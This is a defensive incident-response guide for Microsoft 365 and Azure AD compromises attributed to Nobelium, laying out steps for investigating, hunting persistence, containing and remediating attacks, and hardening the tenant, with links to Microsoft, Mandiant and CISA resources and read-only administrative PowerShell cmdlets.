# Responding to sophisticated attacks on Microsoft 365 and Azure AD 

Working notes on responding to sophisticated attacks on Microsoft 365 and Azure AD (include those carried out by the threat actor [Nobelium](https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/)). 

## Background on Nobelium 

Nobelium has been one of the most prolific and technically-sophisticated threat actors observed over the last couple of years. 

Nobelium distinguished itself from other threat actors, in its skill and adeptness at compromising organisations' Azure AD and Microsoft 365 cloud environments. Nobelium has been able to do this by combining both well known techniques (e.g. password spraying) and novel techniques into innovative attack paths that allow them to compromise accounts and gain long-term and stealthy access to data stored in cloud services. This is likely reflective of a significant investment Nobelium has made in researching offensive techniques against Microsoft cloud environments.

We will almost certainly see the techniques and tradecraft Nobelium has developed trickling down to other threat actors over the next couple of years, after Nobelium has demonstrated their effectiveness at gaining stealthy access to data. Nobelium has also demonstrated how these techniques can be used to evade traditional endpoint and network security monitoring, making them especially effective at targeting more organisations with more mature cyber security controls that can reliably detect common attacker techniques on endpoints. 

We are also likely to see other threat actors following Nobelium's lead in targeting cloud services, given the sensitive data organizations are storing in cloud services often without sufficiently considering the security controls required to protect and monitor it.

Nobelium has been observed targeting cloud resellers and MSPs, in order to gain access to organisations’ Microsoft cloud environments, as well as directly targeting organisations, through phishing, use of compromise credentials and password spraying. 

Key links to learn more about Nobelium: 

* [Mandiant: Remediation and Hardening Strategies for Microsoft 365 to Defend Against UNC2452](https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/wp-m-unc2452-2021-000343-01.pdf)
* [Mandiant: Suspected Russian Activity Targeting Government and Business Entities Around the Globe](https://www.mandiant.com/resources/russian-targeting-gov-business)
* [Microsoft: Technical blog on SolarWinds attacks](https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/)
* [Microsoft: Updated list of Microsoft blogs](https://msrc-blog.microsoft.com/2020/12/21/december-21st-2020-solorigate-resource-center/)
* [Microsoft: NOBELIUM targeting delegated administrative privileges to facilitate broader attacks](https://www.microsoft.com/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks/)
* [Microsoft: New activity from Russian actor Nobelium](https://blogs.microsoft.com/on-the-issues/2021/10/24/new-activity-from-russian-actor-nobelium/)
* [CISA: Eviction Guidance for Networks Affected by the SolarWinds and Active Directory/M365 Compromise](https://www.cisa.gov/uscert/ncas/analysis-reports/ar21-134a)
* [CISA: Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments](https://us-cert.cisa.gov/ncas/alerts/aa21-008a)
* [Microsoft: Azure Sentinel Post-Compromise Hunting](https://techcommunity.microsoft.com/t5/azure-sentinel/solarwinds-post-compromise-hunting-with-azure-sentinel/ba-p/1995095)
* [Microsoft: Advice for incident responders](https://www.microsoft.com/security/blog/2020/12/21/advice-for-incident-responders-on-recovery-from-systemic-identity-compromises/)
* [Microsoft: Understanding Solorigate's Identity IOCs](https://techcommunity.microsoft.com/t5/azure-active-directory-identity/understanding-quot-solorigate-quot-s-identity-iocs-for-identity/ba-p/2007610)

## Key steps to respond to attacks (work in progress v0.2)

The following ten steps should not necessarily be performed sequentially. Depending on an organisation's risk appetite and response priorities, several of these steps can be performed in parallel or out of order to achieve the best outcome. All errors here are mine and only mine. 

 1. [Mobilise the incident response team and secure their communications](#mobilise-the-incident-response-team-and-secure-their-communications)
 2. [Understand how users are authenticated, and how Azure AD and Microsoft 365 are configured](#understand-how-users-are-authenticated-and-how-azure-ad-and-microsoft-365-are-configured)
 3. [Identify and export available logs and configuration information](#identify-and-export-available-logs-and-configuration-information)
 4. [Investigate the extent of the attacker activity and the access the attacker has gained to the environment](#investigate-the-extent-of-the-attacker-activity-and-the-access-the-attacker-has-gained-to-the-environment)
 5. [Take immediate containment measures to remove attacker access to known compromised accounts and identities (Optional)](#take-immediate-containment-measures-to-remove-attacker-access-to-known-compromised-accounts-and-identities)
 6. [Perform a more comprehensive review to identify any persistent access the attacker has gained to accounts, systems or data](#perform-a-more-comprehensive-review-to-identify-any-persistent-access-the-attacker-has-gained-to-accounts-systems-or-data)
     + [Hunt for modifications to the configuration of the Azure AD tenant](#hunt-for-modifications-to-the-configuration-of-the-azure-ad-tenant)
     + [Hunt for Golden SAML Attacks](#hunt-for-golden-saml-attacks)
     + [Hunt for the compromise of privileged accounts](#hunt-for-the-compromise-of-privileged-accounts)
     + [Hunt for hijacked Azure AD Applications and Service Principals](#hunt-for-hijacked-azure-ad-applications-and-service-principals)
     + [Hunt for malicious modifications to mailboxes and the Exchange Online configuration](#hunt-for-malicious-modifications-to-mailboxes-and-the-exchange-online-configuration)
     + [Hunt for illicit application consent attacks](#hunt-for-illicit-application-consent-attacks)
     + [Hunt for the compromise of on-premises systems and accounts](#hunt-for-the-compromise-of-on-premises-systems-and-accounts)
     + [Hunt for the compromise of and malicious changes to Azure resources](#hunt-for-the-compromise-of-and-malicious-changes-to-azure-resources)
 7. [Monitor for further attacker activity and prepare to rapidly respond](#monitor-for-further-attacker-activity-and-prepare-to-rapidly-respond)
 8. [Regain administrative control and remove all attacker access](#regain-administrative-control-and-remove-all-attacker-access)
 9. [Assess data accessed and / or exfiltrated by the attacker](#assess-data-accessed-and-or-exfiltrated-by-the-attacker)
 10. [Improve security posture to defend against further attacks](#improve-security-posture-to-defend-against-further-attacks)

Members of the cyber security community that have inspired content for this repo, as well as the work published by **Mandiant**, **Microsoft** and **CISA**, include: 
* [@DrAzureAD](https://twitter.com/DrAzureAD) - [excellent PowerShell framework AADInternals](https://o365blog.com/aadinternals/) and [blog](https://o365blog.com/)
* [@DebugPrivilege](https://twitter.com/DebugPrivilege) - [all things incident response](https://m365internals.com/)
* [@PyroTek3](https://twitter.com/PyroTek3) - [the goto blog on Active Directory](https://adsecurity.org/)
* [@stevesyfuhs](https://twitter.com/stevesyfuhs) - [checkout these tweet threads](https://syfuhs.net/)
* [@inversecos](https://twitter.com/inversecos) - [M365 incident response and detections](https://www.inversecos.com)

Key tools to perform incident response against Azure AD and Microsft 365:

* [Mandiant Azure AD Investigator](https://github.com/mandiant/Mandiant-Azure-AD-Investigator)
* [Hawk](https://github.com/T0pCyber/hawk)
* [Azure AD Investigator PowerShell module](https://github.com/AzureAD/Azure-AD-Incident-Response-PowerShell-Module) (best docs [here](https://m365internals.com/2021/04/17/incident-response-in-a-microsoft-cloud-environment/))
* [AzureAD Security Assessment](https://github.com/AzureAD/AzureADAssessment)
* [AzureAD PowerShell module](https://docs.microsoft.com/en-us/powershell/module/azuread/?view=azureadps-2.0)
* [AADInternals](https://o365blog.com/aadinternals/)
* [MSOnline PowerShell module](https://docs.microsoft.com/en-us/powershell/module/msonline/?view=azureadps-1.0)
* [ExchangeOnlineManagement PowerShell module](https://docs.microsoft.com/en-us/powershell/exchange/exchange-online-powershell-v2?view=exchange-ps)
* [CISA Sparrow](https://github.com/cisagov/Sparrow)
* [Crowdstrike](https://github.com/CrowdStrike/CRT)
* [AzureADConfigAssessment Create-AppConsentGrantReport.ps1](https://github.com/mepples21/azureadconfigassessment/blob/master/Create-AppConsentGrantReport.ps1)
* [Azure Sentinel Detections](https://github.com/Azure/Azure-Sentinel/tree/master/Detections)
* [Office-365-Extractor](https://github.com/PwC-IR/Office-365-Extractor)

## Mobilise the incident response team and secure their communications

-   **Agree response priorities and objectives** to guide decision making during the course of the response.

-   **Secure the response team’s communications** to ensure that the attacker is not able to intercept communications (an attacker could have ongoing access to emails if they have compromised the accounts of members of the response team, privileged accounts, or applications and service principals with sensitive permissions).

-   **Establish response programme governance and workstreams** to ensure that response activities are effectively coordinated.

-   **Manage the response** by establishing a regular cadence of meetings, tracking progress against the objectives, and managing risks and issues.

## Understand how users are authenticated and how Azure AD and Microsoft 365 are configured

-   **Map out the authentication flows for how users are authenticated**, including what trusted domains are configured in Azure AD, what authentication methods these domains use, and if federated authentication is configured.

-   **Understand how Azure AD and Microsoft 365 are configured** including what accounts have privileged roles, what trust relationships exist with cloud service providers and how third-parties administer the environment, including reviewing:
    - Trusted domains and federation settings with on-premises Active Directory domains (MSOnline: Get-MsolDomain, Get-MsolFederationProperty)
    - Partner relationships with delegated admin privileges (AADInternals: Get-AADIntMSPartners, requires Global Admin)
    - Accounts that are members of highly privileged roles in Azure AD, including for Global Administrator, Application Administrator, Cloud Application Administrator, Exchange Administrator, Privileged Role Administrator, User Administrator, SharePoint Administrator and Hybrid Identity Administrator (see script referenced in [this whitepaper](https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/wp-m-unc2452-2021-000343-01.pdf))
    - Accounts that are members of highly privileged roles and synced with on-premises Active Directory domains
    - Accounts with multi-factor authentication enabled and not enabled (Azure AD Investigator: Get-AzureADIRMfaAuthMethodAnalysis)
    - Administer On Behalf Of (AOBO) configured for Azure subscriptions
    - Conditional access rules and trusted locations
    - Legacy authentication settings
    - Azure AD Connect configuration
    - ADFS Application configuration
    - Mailbox authentication settings (ExchangeOnlineManagement: Get-Mailbox -Resultsize Unlimited -Filter | Select UserPrincipalName, Audit*)

-   **Understand what services and applications Azure AD provides authentication for**, for example SaaS applications like Salesforce, and how this could be abused by an attacker to gain unauthorised access to data.

-   **Understand key roles and responsibilities** within the organisation and of third-parties in administering and securing Azure AD and Office 365.

-   **Understand available Azure AD and Microsoft 365 licenses**, and how these are allocated out to employees and accounts.

-   **Understand how Azure AD and Office 365 and secured**, including how logs are monitored for security alerts, what security controls / features are configured (e.g. Azure Privileged Identity Management) and privilege groups are reviewed.

## Identify and export available logs and configuration information

-   **Provision Azure AD accounts for the incident response team** secured by multi-factor authentication including the following permissions (adapted from the CISA list [here](https://github.com/cisagov/Sparrow)):

    -   **Azure Active Directory**: Global Reader (Global Admin privileges are required to view Partner relationships) 
    -   **Microsoft Sentinel**: Microsoft Sentinel Contributor + Logic App Contributor 
    -   **Security and Compliance Center**: Compliance Administrator
    -   **Exchange Online Admin Center**: View-Only Audit log, View-Only Configuration, View-Only Recipients, Mail Recipients, Security Group Creation and Membership, User options (utilise a custom group for these specific permissions)

-   **Standup secure Windows analysis systems** with access to backed up storage. Install the key tools and PowerShell modules listed above.   

-   **Review what logs are available from Azure AD, Microsoft 365, and Azure**, including identifying how long logs are being retained for and if logs are being forwarded to a SIEM (see [Key logs to identify and preserve in the initial stages of a response](#key-logs-to-identify-and-preserve-in-the-initial-stages-of-a-response)).

-   **Collect key incident response configuration and log information** by running the following tools [Mandiant Azure AD Investigator](https://github.com/mandiant/Mandiant-Azure-AD-Investigator), [Hawk](https://github.com/T0pCyber/hawk), [Azure AD Investigator PowerShell module: Get-AzureADIRMfaAuthMethodAnalysis ](https://github.com/AzureAD/Azure-AD-Incident-Response-PowerShell-Module), [CISA Sparrow](https://github.com/cisagov/Sparrow), [Crowdstrike](https://github.com/CrowdStrike/CRT), [AzureADConfigAssessment Create-AppConsentGrantReport.ps1](https://github.com/mepples21/azureadconfigassessment/blob/master/Create-AppConsentGrantReport.ps1) and [AzureAD Security Assessment](https://github.com/AzureAD/AzureADAssessment) (Connect-AADAssessment, Invoke-AADAssessmentDataCollection, 
Complete-AADAssessmentReports and New-AADAssessmentRecommendations).

-   **Export available logs from [Azure AD](https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-reports-data-retention), Microsoft 365 Unified Audit Logs (UAL), and [Azure Activity logs](https://docs.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log) for analysis and preservation** (it's important to note that the different ways logs are exported impacts how they can be analysed), if they are not already being forwarded to a Log Analytics workspace or a SIEM. UAL logs can be exported using [Office-365-Extractor](https://github.com/PwC-IR/Office-365-Extractor) and [Mandiant Azure AD Investigator: Get-MandiantBulkUAL](https://github.com/mandiant/Mandiant-Azure-AD-Investigator). Exported UAL logs in the CSV/JSON format can be analysed using the [Power Query JSON transform feature in Excel](https://docs.microsoft.com/en-us/microsoft-365/compliance/export-view-audit-log-records?view=o365-worldwide) and [Azure Data Explorer](https://m365internals.com/2021/04/17/incident-response-in-a-microsoft-cloud-environment/). Given the size of the logs and the time and effort required to export these, this will likely require an iterative effort of performing targeted log exports, analysing the results, and then kicking off more searches. Exported logs should then be combined into a single timeline of interesting events and preserved. Responders should export logs around:
     - times of interest;
     - relating to identified IOCs
     - for known suspected compromised accounts; and,
     - for the use of suspicious commands e.g. [Set-MailboxFolderPermissions](https://docs.microsoft.com/en-us/powershell/module/exchange/set-mailboxfolderpermission?view=exchange-ps).
	 	 
-   **Review what logs are available for on-premises applications, endpoints and infrastructure**, including identifying how long logs are being retained for and if logs are being forwarded to a SIEM (see [Key logs to identify and preserve in the initial stages of a response](#key-logs-to-identify-and-preserve-in-the-initial-stages-of-a-response)).

-   **Export available logs from on-premises applications, endpoints and infrastructure for analysis and preservation**, if they are not already being forwarded to a SIEM.

## Investigate the extent of the attacker activity and the access the attacker has gained to the environment

-   **Review and triage outputs of incident response tooling** to identify initial investigative leads, indicators of compromise, and suspicous actiity and configurations that requires further investigtion.

-   **Identify identities and systems potentially compromised by the attacker**, by reviewing cloud logs for signs suspicious activity (see section [Key signs of suspicious activity](#key-signs-of-suspicious-activity) below) and any known indicators of compromise.

-   **Identify how initial access was gained** for example through phishing, compromise of on-premises environment, brute-forcing cloud accounts or through compromising a cloud service provider (see [Initial access techniques for gaining access to Microsoft 365 and Azure AD](#initial-access-techniques-for-gaining-access-to-microsoft-365-and-azure-ad) below).

-   **Investigate the extent of attacker’s activity** including how long the attacker had access to the environment and what they did with this access

- **Identify any ‘persistence’ the attacker was using or was able to gain** by reviewing the outputs of the above incident response tools, reviewing Azure AD Sign-in logs for any signs of persistence methods being used (e.g. suspicious sign-ins from Service Principals), and reviewing Azure AD Audit logs for signs of these being configured (e.g. credentials being added to Service Principals).

-   **Identify whether the attack used their access to compromise SaaS applications** by reviewing SaaS authentication logs.

## Take immediate containment measures to remove attacker access to known compromised accounts and identities

Optional step that depends on an organisation's response priorities and objectives. 

-   **Disable known compromised accounts**

-   **Block logins for known bad IP addresses**, with Conditional Access rules 

-   **Remove delegated administrator permissions** from partner relationships 

-   **Create break-glass Global Admin accounts, monitor their usage and securely store the passwords**

-   **Restrict global administrator permissions** to members of the response team

-   **Review MFA configuration and validate self-service password reset contact information for privileged accounts**

-   **Rotate credentials for Service Principals and Applications and revoke refresh tokens**

-   **Reset passwords of all privileged accounts and revoke refresh tokens**

-   **Review guest / third-party accounts and disable accounts where possible**

## Perform a more comprehensive review to identify any persistent access the attacker has gained to accounts systems or data 

The configuration of Azure AD and Microsoft 365, and avaliable logs, should be reviewed for suspicious activity and malicious configuration changes, to identify any persistent access the attacker has gained to accounts, systems or data.

1. [Hunt for modifications to the configuration of the Azure AD tenant](#hunt-for-modifications-to-the-configuration-of-the-azure-ad-tenant)
2. [Hunt for Golden SAML attacks](#hunt-for-golden-saml-attacks)
3. [Hunt for the compromise of privileged accounts](#hunt-for-the-compromise-of-privileged-accounts)
4. [Hunt for hijacked Azure AD Applications and Service Principals](#hunt-for-hijacked-azure-ad-applications-and-service-principals)
5. [Hunt for malicious modifications to mailboxes and the Exchange Online configuration](#hunt-for-malicious-modifications-to-mailboxes-and-the-exchange-online-configuration)
6. [Hunt for illicit application consent attacks](#hunt-for-illicit-application-consent-attacks)
7. [Hunt for the compromise of on-premises systems and accounts](#hunt-for-the-compromise-of-on-premises-systems-and-accounts)
8. [Hunt for the compromise of and malicious changes to Azure resources](#hunt-for-the-compromise-of-and-malicious-changes-to-azure-resources)
     
### Hunt for modifications to the configuration of the Azure AD tenant 

-   **Review trusted domains and federation settings**, including by comparing the configuration with the on-premises Active Directory ADFS configuration (comparing settings, token URIs and certificates with those configured on the ADFS server) to identify the addition of federation trusts or modification of existing trusts ([T1484.002](https://attack.mitre.org/techniques/T1484/002/)).

-   **Review partner relationships and delegated administrator permissions** to identify potentially compromised third-parties the attacker is able to use to maintain access to the tenant, or any malicous [partner relationships](https://o365blog.com/post/partners/) the attacker has added to the tenant

-   **Review Conditional Access rules and configured trusted locations**, for modifications to rules for example adding IPs to trusted locations

-   **Review Audit AD Audit logs for any malicious changes to the Azure AD tenant** for example adding [new or modifying existing federation settings](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AuditLogs/ADFSDomainTrustMods.yaml), or adding new [partner relationships](https://o365blog.com/post/partners/).

-   **Review Azure AD Signin logs** for suspicious signins by third-party partner accounts using delegated administrator privileges.  
 
### Hunt for Golden SAML attacks 

-   **Review Azure AD Sign-in logs for evidence of forged SAML tokens being used to authenticate to the tenant**, after the attacker has been able to compromise the organisation's ADFS token-signing certificate. 

-   **Review risk events and detections associated with privileged account logins** to identify any compromised accounts. 

### Hunt for the compromise of privileged accounts 

-   **Review accounts in privileged Azure AD roles** to identify any accounts added to privileged roles by the attacker.

-   **Review privileged Exchange accounts** to identify any accounts added to privileged roles by the attacker.

-   **Review Azure AD Sign-in logs for suspicious logins to identify the compromise of privileged accounts**, for example for anomalous logins by country, impossible travel logins and logins from cloud services VPNs/VPSs/Azure/AWS/GCP (Note attackers have been seen using [residential IP proxy services or newly provisioned geo located infrastructure](https://www.mandiant.com/resources/russian-targeting-gov-business), to evade MFA and obfuscate logging (e.g. a geographically co-located azure instance))

-   **Review Azure AD Sign-in logs for password spraying, credential stuffing, brute forcing attacks targeting privileged accounts**, also repeated multi-factor authentication challenges being denied by the user / failing ([Attackers have been seen abusing multi-factor authentication by leveraging “push” notifications on smartphones](https://www.mandiant.com/resources/russian-targeting-gov-business)).

-   **Review Azure AD Sign-in logs for the use of legacy protocols** to login to privileged accounts (Attackers bypass requirements for multi-factor authentication by authentication with legacy protocols)

-   **Review Azure AD Sign-in logs for anomalous logins from on-premises infrastructure** (used by attackers to bypass Conditional Access rules and requirements for multi-factor authentication)

-   **Review for fake devices being associated to privileged accounts**

-   **Review for Azure AD Audit logs** for privileged accounts being created, accounts being added to privileged roles, or other suspicious events related to privileged accounts, for example passwords being reset, re-enrolling accounts for MFA. 

-   **Review risk events and detections associated with privileged account logins**

-   **Review the permissions of guest accounts and accounts used by third-parties** to identify evidence of accounts being added to privileged roles by the attacker.

-   **Review for Azure AD Sign-in logs for suspicious sign-ins from third-parties with partner relationships via delegated administrator permissions**

### Hunt for hijacked Azure AD Applications and Service Principals 

-   **Identify Applications and Service Principal with sensitive "Application" Microsoft Graph API permissions configured, and other sensitive application specific API permissions**, including AppRoleAssignment.ReadWrite.All, RoleManagement.ReadWrite.Directory, and Mail.Read

-  **Identify Service Principals with both credentials and sensitive permissions** to identify the malicious addition of credentials to new or existing Service Principals including "first party" Microsoft / built-in by default Service Principals ([T1098.001](https://attack.mitre.org/techniques/T1098/001/)) (AzureAD: Get-AzureADServicePrincipal -All $True) 

-  **Identify Applications with credentials and sensitive permissions** to identify the malicious addition of credentials to new or existing Applications ([T1098.001](https://attack.mitre.org/techniques/T1098/001/)) (AzureAD: Get-AzureADApplication -All $True)

-   **Review all Azure AD logs for suspicious sign-ins by Service Principals with sensitive permissions** to identify compromised services principals (including considering whether **third-party Service Principal credentials** have been compromised) 

-   **Review Azure AD Audit logs for the creation of Service Principals and Applications**

-   **Review Azure AD Audit logs to identify the addition of credentials to Service Principals and Applications**

-   **Review Azure AD Audit logs to identify any malicious changes to Azure AD** for example adding sensitive permissions to Applications or Service Principals.

### Hunt for malicious modifications to mailboxes and the Exchange Online configuration 

-   **Review mailbox folder permissions to identify malicious changes to mailbox permissions**, for example adding permissions to Default or Anonymous users ([T1098.002](https://attack.mitre.org/techniques/T1098/002/)) 

-   **Review mailbox and inbox rules for mailboxes to identify malicious rules being created**

-   **Review transport rules to identify malicious rules being added**

-   **Review client access settings configured on mailboxes to identify malicious changes**

-   **Review audit logs configured on mailboxes** to identify what logging should be expected and whether the attacker has likely made any malicous changes. 

-   **Review accounts with application impersonation permissions** to identify whether the attacker has added this permissions to any accounts. 

-   **Review UAL logs for suspicious changes** for example permissions being changed on mailboxes or the addition of Application impersonation role to accounts.

-   **Review UAL logs for suspicous activity** including service principals accessing mailboxes (requries MailItemsAccessed), eDiscovery searches and PowerShell being used to access mailboxes. 

### Hunt for illicit application consent attacks 

-  **Review AAD application consent grants and AAD application delegate permissions** to identify [illicit application consent attacks](https://docs.microsoft.com/en-us/security/compass/incident-response-playbook-app-consent) that allow attackers access to emails, data or to perform sensitive operations.

### Hunt for the compromise of on-premises systems and accounts 

-   **Deploy Endpoint Detection and Response tooling to on-premises and Azure servers** to allow the response team to hunt for and investigate attacker activity, and configure detection rules for known attacker indicators of compromise.

-   **Sweep on-premises systems and logs for identified indicators of compromise**

-   **Review on-premises security alerts** for any alerts that could indicated the compromise of the on-premises environment.  

-   **Review process and network activity from (tier-0 Domain Controllers, ADFS or AD Connect servers) systems for evidence known techniques used to move between cloud and on-premises environments**, including the attacker: 
     -   Stealing or modify token-signing certificates on ADFS servers to perform a Golden SAML attack
     -   Backdooring Pass-Through Authentication to compromise cloud accounts.
     -   Compromising the AZUREADSSOACC account to forge Kerberos tickets (Silver ticket attack)
     -   Compromising the Azure AD Connect accounts to set password for accounts in privileged cloud groups
     -   Dumping credentials to accounts in privileged cloud groups by compromising workstations, servers and domain controllers
     -   Compromising stored service principal credentials from on-premise systems, and use these to authenticate to Azure AD
	   -   Compromise secrets from multi-factor authentication management server and use this to bypass MFA
	   -   Stopping Sysmon and Splunk logging on devices and clearing Windows Event Logs (see ref [here](https://www.mandiant.com/resources/russian-targeting-gov-business))

-   **Perform an at-scale audit of auto-runs for all on-premises systems**

-   **Review the use of Intune and Microsoft Endpoint Manager to manage systems**, including those used by privileged users 

-   **Review Azure AD signin logs for suspicious logons from AD Connect accounts**

### Hunt for the compromise of and malicious changes to Azure resources 

-   **Identify any malicious changes to permissions on Azure resources** for example adding new owners to subscriptions or resource groups.

-   **Identify whether the attacker used their access to compromise Azure services**, including by reviewing Azure Audit logs to identify use of the Azure Run command to execute commands on VMs, downloading of virtual machine images, creating SAS URLs, listing storage accounts keys, and changing permissions on storage buckets.

-   **Review process and network activity from Azure servers**, for example to identify the attacker compromising VM with managed identities configured

## Monitor for further attacker activity and prepare to rapidly respond 

-   **Onboard Azure AD, Microsoft 365 and Azure Activity logs to Microsoft Sentinel**

-   **Configure and tune detection rules** for the configuration of persistence mechanism (e.g. addition of credentials to service principals and modifications to federation settings) and common attacker techniques (e.g. using Azure Run commands) (see Microsoft Sentinel Github rules [Azure AD Audit log detection rules](https://github.com/Azure/Azure-Sentinel/tree/8768b916756b827da02d1dfd95ece8fbe27049c4/Detections/AuditLogs), [Azure Activity detection rules](https://github.com/Azure/Azure-Sentinel/tree/8768b916756b827da02d1dfd95ece8fbe27049c4/Detections/AzureActivity), and [Azure AD Sign-in detection rules](https://github.com/Azure/Azure-Sentinel/tree/8768b916756b827da02d1dfd95ece8fbe27049c4/Detections/SigninLogs), [Office 365 (UAL) detection rules](https://github.com/Azure/Azure-Sentinel/tree/8768b916756b827da02d1dfd95ece8fbe27049c4/Detections/OfficeActivity))

-   **Configure Microsoft Sentinel detection rules for indicators of compromise identified in the incident**

-   **Configure Microsoft Sentinel Automation rules and Playbooks** to alert on incidents being created. 

-   **Configure** [**Microsoft 365 Advanced Auditing features**](https://docs.microsoft.com/en-us/microsoft-365/compliance/mailitemsaccessed-forensics-investigations) **and ensure logs are feeding through into Azure Sentinel**

-   **Stand up 24/7 monitoring and response capability to monitor for security alerts, risk events and access to privileged accounts**

-   **Deploy cloud-based threat protection tooling, including** [Microsoft Defender for Identity](https://docs.microsoft.com/en-us/defender-for-identity/what-is) and Microsoft Defender for Cloud Apps.

-   **Perform threat hunting based on the tools and techniques used in the incident** to ensure all further activity has been identified, including by enabling the [Microsoft Solarwinds hunting workbook](https://techcommunity.microsoft.com/t5/microsoft-sentinel-blog/solarwinds-post-compromise-hunting-with-azure-sentinel/ba-p/1995095)

## Regain administrative control and remove all attacker access

### Prepare 

-   **Methodically plan how to remove all attacker access and persistence** identified during the investigation, and how to perform all remediation tasks whilst managing business impact.

-   **Block known indicators of compromise known to be used by the threat actor**, including by blocking IP addresses, sinkholing domains and blocking malware from executing.

-   **Temporarily break trust with on-premises Active Directory domains,** and switch to using cloud-mastered identity while remediating the on-premise environment.

### Azure AD 

-   **Remove persistence methods and malicious configuration changes** and validate that this has been successfully performed.

-   **Remediate the initial access method used by the attacker**, for example by setting strong passwords,  enabling MFA on compromised accounts, disabling compromised accounts and removing delegated administrator permissions.

-   **Remove accounts from privileged Azure AD roles** unless strictly required (all privileged roles should be removed from accounts that are configured to sync with on-premises Active Directory domain).

-   **Remove sensitive permissions from Service Principals** unless strictly required in order for the AAD applications to function.

-   **Limit privileged access to the tenant**, by configuring conditional access to limit the use of accounts with privileged roles, including enforcing multi-factor authentication using verification codes or hardware tokens, and restricting their use to [privileged access workstations](https://docs.microsoft.com/en-us/security/compass/privileged-access-devices).

-   **Create break glass global administrator accounts and ensure that these are excluded from all Conditional Access policies**

-   **Reset passwords of all privileged Azure AD accounts and revoke refresh tokens**

-   **Rotate credential material for any Service Principals that are members of privileged roles and revoke refresh tokens**

-   **Reset passwords for known compromised accounts and revoke refresh tokens**

-   **Block legacy authentication methods and review conditional access policies that are configured**

-   **Assess what authentication material the attacker may have been able to access** with the accounts they were able to compromise, and whether there was sufficient logging to confirm this (e.g. Access keys for Azure Storage accounts) and take steps to mitigate this risk.

-   **Assess what other authentication material the attacker would have been able to generate / steal** with the accounts they were able to compromise, and whether there was sufficient logging to confirm this (e.g. creating shared access signatures for Azure Storage accounts) and take steps to mitigate this risk.

### Active Directory 
-   **Remove domain administrator privileges from all on-premises user accounts and service accounts**, apart from those used by the remediation team and for break glass accounts.

-   **Identify, review and harden access to all on-premises Tier 0 systems**

-   **Remediate accounts in the on-premises environment**, including:  
    - Resetting all privileged accounts  
    - Resetting the AZUREADSSOACC account  
    - Resetting the on-premises AD DS connector account  
    - Resetting the Azure AD connector account  
    - Resetting the on-premises ADSync Service Account  
    - Resetting the local accounts on DCs  
    - Rotating the 
    token-signing certificate twice  
    - Resetting the Kerberos ticket granting ticket account twice  
    - Rotating secrets associated with remote access MFA token generation

-   **Rebuild all compromised systems**

-   **Reset VMware ESXi root account passwords**

-   **Restart all systems** to mitigate the risk of in-memory malware still running, for example Cobalt Strike.

-   **Re-establish federation trusts between on-premises Active Directory domains and Azure AD tenant**

## Assess data accessed and or exfiltrated by the attacker 

-   **Assess the business impact of incident** by investigating what data was accessed by the attacker.

## Improve security posture to defend against further attacks

-   **Deploy Azure AD Password Protection** to detect and block known weak passwords.

-   **Remove delegated administrator permissions** from partner relationships, and migrate to [granular delegated admin privileges (GDAP)](https://docs.microsoft.com/en-us/partner-center/gdap-introduction) if still required.

-   **Perform an enterprise-wide passwords reset**, including resetting all service accounts and configuring employee accounts to change password at next logon.

-   **Roll-out, configure and enforce multi-factor authentication for all user accounts** using conditional access policies.

-   **Ensure that multi-factor authentication is configured and enforced for other externally accessible applications**, for example remote access portals and VPNs.

-   **Identify and remediate cyber security posture weaknesses that allowed the attacker to occur** by mapping techniques used by the attacker against the MITRE ATT&CK Framework and triaging targeted improvements.

-   **Implement sustainably secure cloud and on-premises administration practices** based on Microsoft’s [enterprise access model](https://docs.microsoft.com/en-us/security/compass/privileged-access-access-model).

-   **Restrict the use of on-premises domain administrator accounts** to prevent credentials for these accounts being unnecessarily exposed on systems increasing the risk of compromise. Restrict accounts in the domain admins group from [logging into workstations and servers](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-f--securing-domain-admins-groups-in-active-directory), to start to implementing a [three-tiered administration model](https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access).

-   **Implement** [**Azure AD**](https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/active-directory-deployment-checklist-p2) **and** [**Microsoft 365**](https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/security-roadmap?view=o365-worldwide) **good practice security guidance**, as well as Microsoft's guidance on [protecting Microsoft 365 from on-premises attacks](https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/protect-m365-from-on-premises-attacks).

-   **Identify any Application or Service Principals using passwords as credentials and migrate these to using more secure forms of authentication whenever possible** (certificate, managed identities, or Windows Integrated Authentication or certificate).

-   **Remove sensitive delegated permissions from applications, remove unnecessary grants**, and prevent users from being able to consent to unknown applications.

-   **Ensure conditional access policies limit access** to hybrid azure ad joined or compliant devices (prevent the use of organisation accounts on unmanaged and personal devices, where authentication tokens can be stolen by malware).

-   **Ensure all logs in [Key logs to identify and preserve in the initial stages of a response](#key-logs-to-identify-and-preserve-in-the-initial-stages-of-a-response) are onboarded to the SIEM**

-   **Enhance detection and response capability by deploying and tuning further detection rules**, for to detect the compromise and abuse of privileged accounts, persistence techniques, and for rare global events (also centrally collect and retain logs).

-   **Ensure that Azure AD Identity Protection is configured with policies for high risk users and sign-ins**, along with Azure AD Self-Service Password Reset (SSPR) for all users.

-   **Configure [Conditional Access rules to restrict logons for Service Principals](https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/workload-identity) with sensitive permissions** to restict signins to Service Principals to an allow list of IP addresses. 

-   **Review Microsoft Secure Secure, triage and implement remediation recommendations**

-   **Assign responsibility for regally auditing Azure AD and Microsoft 365 configuration**, including Applications and Service Principals, federation trust settings, Conditional Access policies, trust relationships and Microsoft Secure Score recommendations

-   **Enable Privileged Identity Manager in Azure AD** and set eligible assignments to Azure AD roles where these can be activated for a limited time when needed.

-   **Configure** [**Privileged Access Management**](https://techcommunity.microsoft.com/t5/microsoft-security-and/privileged-access-management-in-office-365-is-now-generally/ba-p/261751) **in Microsoft 365**

-   **Limit application consent policy to administrators**

-   **Block email forwarding to remote domains**

-   **Configure enhanced mailbox audit logging**, including MailItemsAccessed.

